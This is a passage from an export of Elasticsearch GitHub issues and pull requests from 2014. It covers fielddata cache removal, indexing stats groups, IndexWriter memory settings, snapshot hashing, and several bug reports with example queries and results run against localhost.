</comment><comment author="bly2k" created="2014-08-26T11:14:38Z" id="53405288">@clintongormley that's correct. However, if you run the example in ES 1.2.3 (or anything older than 1.3), the first search query will fail, and the second query will succeed. At first I thought i was a bug that was fixed in 1.3 and I asked @jpountz and he said there was a refactoring in 1.3 that "accidentally/silently" made this work all the time. 

So it's either a bug prior to 1.3 that was (accidentally) fixed in 1.3, or, it's a new bug that was introduced in 1.3 (breaking the old behavior). Either way could be right - we just pick one.
</comment><comment author="clintongormley" created="2014-08-26T13:19:44Z" id="53418599">The bug was in pre-1.3.  They're now working as they were intended.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fielddata: Remove soft/resident caches.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7443</link><project id="" key="" /><description>These caches have no advantage compared to the default node cache. Additionally,
the soft cache makes use of soft references which make fielddata loading quite
unpredictable in addition to pushing more pressure on the garbage collector.

The `none` cache is still there because of tests. There is no other good
reason to use it.

LongFieldDataBenchmark has been removed because the refactoring exposed a
compilation error in this class, which seems to not having been working for a
long time. In addition it's not as much useful now that we are progressively
moving more fields to doc values.
</description><key id="41113780">7443</key><summary>Fielddata: Remove soft/resident caches.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">jpountz</reporter><labels><label>:Fielddata</label><label>breaking</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T22:03:34Z</created><updated>2015-06-07T12:47:58Z</updated><resolved>2014-08-27T12:29:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-26T08:09:56Z" id="53388228">I agree we should drop them at least in master. I wonder what if we should / need to keep them around in 1.x for a while an deprecate them first so folks know about it? On the other hand this is really bad if you use it today so I am all for dropping?
</comment><comment author="jpountz" created="2014-08-26T08:21:04Z" id="53389257">At first I only planned to propose this to master but as you noted using eg. the soft cache today can be pretty bad so maybe it's more helpful to drop them now.
</comment><comment author="martijnvg" created="2014-08-26T09:23:40Z" id="53395462">I'm +1 for removing these caches on 1.x as well. I think we should mark this issue as breaking? 

Also if someone has an index that is configured to use either soft or resident cache, then after upgrading this indices will fail to load? (maybe not immediately but after close and open or when a shard gets moved to an node that didn't have this index before)  So maybe we should still support these settings, but under the hood we will be using the nodes field data cache?
</comment><comment author="dakrone" created="2014-08-26T09:29:56Z" id="53396075">+1 on removing these from 1.x and master and marking the issue as breaking. Doc values should be the alternative rather than soft caches. Either removing from 1.4 or 1.5 (with deprecation) sounds good to me.
</comment><comment author="s1monw" created="2014-08-26T13:57:44Z" id="53423708">sounds good to me /cc @kimchy 
</comment><comment author="s1monw" created="2014-08-26T13:59:16Z" id="53423932">one questions I have here is should we maybe log if such a cache is configured on an old index instead of silently falling back to the node cache. I also think we should reject these caches if they are configured on an index created on 1.4 or greater?
</comment><comment author="jpountz" created="2014-08-27T09:23:57Z" id="53545712">@s1monw I pushed a new commit. This is basically what the diff would look like on 1.x, on master these caches will just be removed.
</comment><comment author="jpountz" created="2014-08-27T10:05:57Z" id="53549794">@s1monw updated
</comment><comment author="s1monw" created="2014-08-27T11:11:52Z" id="53555320">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexing groups</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7442</link><project id="" key="" /><description>It'd be cool to have indexing groups like we have search groups.  Something like:

``` js
curl -XPUT 'http://localhost:9200/twitter/tweet/1?stats=foo' -d '{
    "user" : "kimchy",
    "post_date" : "2009-11-15T14:12:12",
    "message" : "trying out Elasticsearch"
}'
```

and

``` js
curl -XPOST 'localhost:9200/test/type1/1/_update?stats=foo,bar' -d '{
    "script" : "ctx._source.tags.contains(tag) ? ctx.op = \"delete\" : ctx.op = \"none\"",
    "params" : {
        "tag" : "blue"
    }
}'
```

and

``` js
curl -XPOST 'localhost:9200/test/type1/1/_update' -d '{
    "script" : "if (ctx._source.tags.contains(tag)) { ctx.op = \"delete\"; stats &lt;&lt; \"found \" + tag } else { ctx.op = \"none\"}",
    "params" : {
        "tag" : "blue"
    },
    "lang": "groovy"
}'
```

I must confess I'm more interested in this for last case: getting statistics groups out of scripted updates.
</description><key id="41102983">7442</key><summary>Indexing groups</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels><label>:Stats</label><label>adoptme</label><label>feature</label></labels><created>2014-08-25T20:33:33Z</created><updated>2015-11-21T17:31:09Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-25T20:42:56Z" id="53327212">It'd come out like:

``` bash
curl localhost:9200/_stats/indexing?groups=foo,bar
```

``` js
{
  "_shards": {
    "total": 9,
    "successful": 9,
    "failed": 0
  },
  "_all": {
    "primaries": {
      "indexing": {
        "index_total": 702,
        "index_time_in_millis": 2833,
        "index_current": 0,
        "delete_total": 10,
        "delete_time_in_millis": 10,
        "delete_current": 0,
        "groups": {
          "foo": {
            "index_total": 300,
            "index_time_in_millis": 2033,
            "index_current": 0,
            "delete_total": 10,
            "delete_time_in_millis": 10,
            "delete_current": 0
          },
          "bar": {
            "index_total": 302,
            "index_time_in_millis": 1000,
            "index_current": 0,
            "delete_total": 0,
            "delete_time_in_millis": 0,
            "delete_current": 0
          }
        }
      }
    }
  }
}
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>indices.memory.index_buffer_size is spread evenly across active shards</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7441</link><project id="" key="" /><description>Right now `indices.memory.index_buffer_size` is divided evenly on all active shards on the node.  It'd be more useful for those of us with many shards if we could have more control over how its divided up or if it were just a single pool.  I imagine single pool would be difficult but giving us a knob for weight or minimum size or something on the index level might be more doable.

I'm actually not super sure how important this is from a performance standpoint - but my gut says raising this on my larger, hotter shards will make fewer segments.  Maybe its not that big a deal because the segments stay small any way....
</description><key id="41098021">7441</key><summary>indices.memory.index_buffer_size is spread evenly across active shards</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">nik9000</reporter><labels><label>discuss</label></labels><created>2014-08-25T19:47:29Z</created><updated>2015-11-21T17:30:15Z</updated><resolved>2015-11-21T17:30:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-04-05T14:50:25Z" id="89787506">@mikemccand any thoughts about this?
</comment><comment author="mikemccand" created="2015-04-06T15:46:11Z" id="90118329">I agree the static "divide equally on all active shards" is not great since a shard receiving very low docs/sec is unreasonably getting as much IndexWriter buffer as a shard under intense indexing.

Ideally, the allowed RAM would somehow be dynamically shared/tracked across N IndexWriters such that once the total RAM used is too high, Lucene would pick the largest in-memory segment (across all N IndexWriters) and move it to disk.  But this would be a tricky/invasive change to Lucene's APIs...

Maybe in the mean-time we should open up an [expert] setting in Elasticsearch to "bias" how the allowed RAM is divided?  It could be a linear weight, defaulting to 1, and we assign RAM in proportion to that weight divided by the sum of all weights for all shards on this node? 
</comment><comment author="clintongormley" created="2015-11-21T17:30:15Z" id="158663627">Closing in favour of https://github.com/elastic/elasticsearch/pull/14121
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add `segments.index_writer_max_memory` to stats</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7440</link><project id="" key="" /><description>We recently added stats for how much RAM IndexWriter is currently using (#6483); this also adds the max RAM IndexWriter is allowed to use before it must flush buffered documents to a new segment.

Closes #7438 
</description><key id="41087437">7440</key><summary>Add `segments.index_writer_max_memory` to stats</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Stats</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T18:00:44Z</created><updated>2015-06-07T12:10:46Z</updated><resolved>2014-08-25T18:42:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="areek" created="2014-08-25T18:06:17Z" id="53302815">This looks good.
</comment><comment author="nik9000" created="2014-08-25T18:08:59Z" id="53303368">Looks good.  I was actually just poking around this area and thinking it'd be good to have this recorded.
</comment><comment author="mikemccand" created="2014-08-25T18:14:55Z" id="53304545">Thanks @areek and @nik9000, I'll push.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix discovery.id.seed</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7439</link><project id="" key="" /><description>Closes #7437
</description><key id="41070230">7439</key><summary>Fix discovery.id.seed</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T15:05:26Z</created><updated>2015-06-07T19:00:53Z</updated><resolved>2014-08-25T15:33:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-25T15:30:10Z" id="53279501">LGTM - thx Nik.
</comment><comment author="s1monw" created="2014-08-25T15:37:43Z" id="53280697">g00d catch
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Stats: include percentage of the IW RAM buffer used</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7438</link><project id="" key="" /><description>Today in stats we return the amount of RAM IndexWriter is using to buffer up indexed documents (index_writer_memory_in_bytes) but it would be helpful to also express this as a percentage of that IndexWriter's configured RAM buffer size, because Elasticsearch does its own computation from what the application requested (indices.memory.index_buffer_size) to divide up that budget across all shards ...
</description><key id="41070098">7438</key><summary>Stats: include percentage of the IW RAM buffer used</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>enhancement</label></labels><created>2014-08-25T15:04:20Z</created><updated>2014-08-25T19:14:47Z</updated><resolved>2014-08-25T18:42:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>discovery.id.seed doesn't look like its working</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7437</link><project id="" key="" /><description>Tried using discovery.id.seed and it didn't work as expected.
</description><key id="41070077">7437</key><summary>discovery.id.seed doesn't look like its working</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">nik9000</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T15:04:04Z</created><updated>2014-08-25T15:33:23Z</updated><resolved>2014-08-25T15:33:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Add BWC layer to .si / segments_N hashing to identify segments accurately</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7436</link><project id="" key="" /><description>Due to additional safety added in #7351 we compute now a strong hash for
.si and segments_N files which are compared during snapshot / restore.
Old snapshots don't have this hash which can cause unnecessary copying
of large amount of data. This commit adds the ability to fetch this
hash from the blob store if needed.

Closes #7434
</description><key id="41069555">7436</key><summary>Add BWC layer to .si / segments_N hashing to identify segments accurately</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Store</label><label>bug</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T14:58:56Z</created><updated>2015-06-07T19:01:21Z</updated><resolved>2014-08-26T13:38:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-25T14:59:13Z" id="53274880">@imotov can you take a look?
</comment><comment author="imotov" created="2014-08-26T00:24:48Z" id="53357480">Left a few minor comments. Otherwise LGTM.
</comment><comment author="s1monw" created="2014-08-26T08:43:01Z" id="53391351">@imotov updated the PR
</comment><comment author="imotov" created="2014-08-26T11:02:02Z" id="53404325">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Java API improvement: Factory methods for SuggestionBuilders</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7435</link><project id="" key="" /><description>Introduce a static factory class SuggestionBuilders (like QueryBuilders, FilterBuilders), containing static method to create SuggestionBuilder instances.

SuggestBuilder class:
- has termSuggestion and phraseSuggestion factory methods 
- hasn't  completionSuggestion nor fuzzyCompletionSuggestion
</description><key id="41067833">7435</key><summary>Java API improvement: Factory methods for SuggestionBuilders</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">gquintana</reporter><labels><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T14:42:24Z</created><updated>2014-09-01T02:20:22Z</updated><resolved>2014-09-01T02:20:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="areek" created="2014-08-26T02:06:52Z" id="53365707">+1 for static factory for completionSuggester and co, I was thinking about adding this a few days ago.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Snapshot/Restore: Add BWC layer to .si / segments_N hashing to identify segments accurately</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7434</link><project id="" key="" /><description>This is a followup from #7351 where we added extra validation to `.si` and `segments_n` files. We now use their content as a has when we diff the snapshot against the store and wise versa. In order to not double the size of the snapshot when the hash is not present we should recalculate that "hash" from the blob store instead.
</description><key id="41066358">7434</key><summary>Snapshot/Restore: Add BWC layer to .si / segments_N hashing to identify segments accurately</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>enhancement</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T14:28:06Z</created><updated>2014-09-24T13:27:59Z</updated><resolved>2014-08-26T13:38:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Infinite loop in GeolocationContextMapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7433</link><project id="" key="" /><description>The parsing logic has the following loop that never terminates:

```
while (token != Token.END_ARRAY) {
  result.add(GeoUtils.parseGeoPoint(parser).geohash());
}
```

It misses a `token = parser.nextToken();` between iterations. 
</description><key id="41047623">7433</key><summary>Infinite loop in GeolocationContextMapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">jpountz</reporter><labels><label>:Suggesters</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T09:52:55Z</created><updated>2015-06-07T19:01:32Z</updated><resolved>2014-08-25T10:05:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[Test] rewrite testNoMasterActions to use latest tooling</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7432</link><project id="" key="" /><description>The test's timeout checks were thrown off by a client created randomly (when the timer was running).

Would love a second pair of eyes to make sure I didn't loose any detail
</description><key id="41046532">7432</key><summary>[Test] rewrite testNoMasterActions to use latest tooling</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels /><created>2014-08-25T09:34:37Z</created><updated>2014-08-26T15:51:53Z</updated><resolved>2014-08-26T15:50:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-25T09:40:42Z" id="53245442">LGTM I'd appreciate quick javadocs on the assertion methods?
</comment><comment author="martijnvg" created="2014-08-26T13:39:09Z" id="53421034">LGTM
</comment><comment author="bleskes" created="2014-08-26T15:51:52Z" id="53443376">I added java docs and push. Thx @s1monw, @martijnvg 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>date_histogram facet float possible overflow</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7431</link><project id="" key="" /><description>I am using ELK stack to visualising our monitoring data, yesterday i came across a weird problem: ElasticSearch date_histogram facet returned floating results that look like an overflow ("min" : 4.604480259023595E18).
Our dataflow is : collectd (cpu/memory) -&gt; riemann -&gt; logstash -&gt; elasticsearch &lt;- kibana.
At first the values were correct, after a few days the values became huge (see attached snapshot of kibana graph)
![image](https://cloud.githubusercontent.com/assets/7490448/4027631/1ce315ba-2c32-11e4-9448-6b14fe147811.png)
the problem solved at midnight when new index created by logstash.

filtered query + Result:
query:

``` json
url -XGET 'http://localhost:9200/logstash-2014.08.24/_search?pretty' -d '{
  "query": {
    "filtered": {
      "query": {
        "bool": {
          "should": [
            {
              "query_string": {
                "query": "subservice.raw:\"processes-cpu_percent/gauge-collectd\" AND (plugin_instance:\"cpu_percent\")"
              }
            }
          ]
        }
      },
      "filter": {
        "bool": {
          "must": [
            {
              "range": {
                "@timestamp": {
                  "from": 1408884312966,
                  "to": 1408884612966
                }
              }
            },
            {
              "range": {
                "@timestamp": {
                  "from": 1408884311948,
                  "to": 1408884327941
                }
              }
            },
            {
              "fquery": {
                "query": {
                  "query_string": {
                    "query": "subservice:(\"processes-cpu_percent/gauge-collectd\")"
                  }
                },
                "_cache": false
              }
            }
          ]
        }
      }
    }
  },
  "size": 500,
  "sort": [
    {
      "metric": {
        "order": "desc",
        "ignore_unmapped": false
      }
    },
    {
      "@timestamp": {
        "order": "desc",
        "ignore_unmapped": false
      }
    }
  ]
}'
```

result:

``` json
{
  "took" : 47,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 2,
    "max_score" : null,
    "hits" : [ {
      "_index" : "logstash-2014.08.24",
      "_type" : "gauge",
      "_id" : "SlzG8bGJQziU0LMoN7nrbQ",
      "_score" : null,
      "_source":{"host":"host1","service":"instance-2014-08-24T1106/processes-cpu_percent/gauge-collectd","state":null,"description":null,"metric":0.7,"tags":["collectd"],"time":"2014-08-24T12:45:25.000Z","ttl":20.0,"type":"gauge","source":"host1","ds_type":"gauge","plugin_instance":"cpu_percent","ds_name":"value","type_instance":"collectd","plugin":"processes","ds_index":"0","@version":"1","@timestamp":"2014-08-24T12:45:15.079Z"},
      "sort" : [ 4604480259023595110, 1408884325088 ]

    }, {

      "_index" : "logstash-2014.08.24",
      "_type" : "gauge",
      "_id" : "8hxToMjpQ5WQIw15DQqIGA",
      "_score" : null,
      "_source":{"host":"host1","service":"instance-2014-08-24T1106/processes-cpu_percent/gauge-collectd","state":null,"description":null,"metric":0.5,"tags":["collectd"],"time":"2014-08-24T12:45:15.000Z","ttl":20.0,"type":"gauge","source":"host1","ds_type":"gauge","plugin_instance":"cpu_percent","ds_name":"value","type_instance":"collectd","plugin":"processes","ds_index":"0","@version":"1","@timestamp":"2014-08-24T12:45:15.079Z"},
      "sort" : [ 4602678819172646912, 1408884315079 ]
    } ]
  }
}
```

date histogram Facet + Results:
query:

``` json
curl -XGET 'http://localhost:9200/logstash-2014.08.24/_search?pretty' -d '{
  "facets": {
    "0": {
      "date_histogram": {
        "key_field": "@timestamp",
        "value_field": "metric",
        "interval": "1s"
      },
      "global": true,
      "facet_filter": {
        "fquery": {
          "query": {
            "filtered": {
              "query": {
                "query_string": {
                  "query": "subservice.raw:\"processes-cpu_percent/gauge-collectd\" AND (plugin_instance:cpu_percent) AND *"
                }
              },
              "filter": {
                "bool": {
                  "must": [
                    {
                      "range": {
                        "@timestamp": {
                          "from": 1408884199622,
                          "to": 1408884499623
                        }
                      }
                    },
                    {
                      "range": {
                        "@timestamp": {
                          "from": 1408884311948,
                          "to": 1408884327941
                        }
                      }
                    },
                    {
                      "fquery": {
                        "query": {
                          "query_string": {
                            "query": "subservice:(\"processes-cpu_percent/gauge-collectd\")"
                          }
                        },
                        "_cache": true
                      }
                    }
                  ]
                }
              }
            }
          }
        }
      }
    }
  },
  "size": 0
}' 
```

result:

``` java
{
  "took" : 24,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1197141,
    "max_score" : 0.0,
    "hits" : [ ]
  },
  "facets" : {
    "0" : {
      "_type" : "date_histogram",
      "entries" : [ {
        "time" : 1408884315000,
        "count" : 1,
        "min" : 4.6026788191726469E18,
        "max" : 4.6026788191726469E18,
        "total" : 4.6026788191726469E18,
        "total_count" : 1,
        "mean" : 4.6026788191726469E18
      }, {
        "time" : 1408884325000,
        "count" : 1,
        "min" : 4.604480259023595E18,
        "max" : 4.604480259023595E18,
        "total" : 4.604480259023595E18,
        "total_count" : 1,
        "mean" : 4.604480259023595E18
      } ]
    }
  }
}
```
</description><key id="41042337">7431</key><summary>date_histogram facet float possible overflow</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">moshe</reporter><labels><label>feedback_needed</label></labels><created>2014-08-25T08:31:54Z</created><updated>2014-09-07T19:15:55Z</updated><resolved>2014-09-07T19:15:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-03T09:37:47Z" id="54273026">@MosheZada  I think I understand the bug: If you intepret the double bits of `0.5` as a long, you get `4602678819172646912`, which is the value that you get in the aggregation. So something somewhere must be interpreting double bits as long bits.

Can you tell us more about the version of Elasticsearch that you are using and how you configure mappings (are you using dynamic mappings or do you configure them explicitely)?
</comment><comment author="moshe" created="2014-09-04T19:15:50Z" id="54529844">I found the cause of the problem,
our logstash used the basic mapping template - that caused elasticsearch guess the type of the metric field (no type specified by default).
most of the times the new index created with metric as double but in sometimes with metric as long.
so i forced metric field to be double by adding:

``` json
       {
         "metric_to_double" : {
           "match" : "metric",
           "match_mapping_type" : "long",
           "mapping" : {
             "type" : "double"
           }
```

to the _default_ section in the logstash template 
Thank you all for making such awesome product :+1: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Indexes unuseable after upgrade from 0.2 to 1.3 and cluster restart</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7430</link><project id="" key="" /><description>We recently tried to upgrade a ES cluster from 0.2 to 1.3. The actual upgrade worked out fine, but once we restarted the whole cluster, we saw those warnings for all shards (constantly repeating):

```
IndexShardGatewayRecoveryException[[maki-log-2014-08-21][3] shard allocated for local recovery (post api), should exist, but doesn't, current files: [write.lock, _checksums-1408609875350, _10f.nrm, segments.gen, _17x.nrm, _10f.tis, _17z.si, _17y.fdt, _17y.tis, _17x.fdx, _10f.frq, _17x.fdt, _17y.tii, _17x.prx, _17y.nrm, _10f.fdx, _10f.fnm, _17x.tis, _10f.tii, _10f.fdt, _17z.cfe, _17x.frq, _17x.tii, segments_j, _10f.prx, _17y.fnm, _17y.fdx, _17y.prx, _17y.frq, _17z.cfs, _17x.fnm]]; nested: FileNotFoundException[No such file [_10f.si]]; ]]
